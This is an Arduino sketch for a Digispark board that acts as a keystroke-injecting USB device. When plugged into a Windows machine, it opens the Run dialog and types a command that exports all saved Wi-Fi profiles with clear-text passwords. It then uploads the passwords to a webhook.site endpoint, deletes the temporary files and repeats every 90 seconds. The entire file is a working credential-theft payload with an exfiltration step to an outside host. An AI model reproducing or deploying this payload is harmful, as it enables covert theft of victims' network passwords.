#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); // LED on Model A
}

void loop() {
  digitalWrite(1, LOW); // Turn off LED
  DigiKeyboard.delay(3000); // Delay before starting

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Start run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /c netsh wlan export profile key=clear > %temp%\\Wi-Fi-PASS && powershell Select-String -Path %temp%\\Wi-Fi-PASS -Pattern 'keyMaterial' | Out-File -FilePath %temp%\\Wi-Fi-PASS.txt -Append; powershell Invoke-WebRequest -Uri 'https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE>' -Method POST -InFile %temp%\\Wi-Fi-PASS.txt; del %temp%\\Wi-Fi-PASS* /s /f /q"); // Combined commands to reduce delay and optimize execution

  digitalWrite(1, HIGH); // Turn on LED when program finishes
  DigiKeyboard.delay(90000); // Delay before looping
}
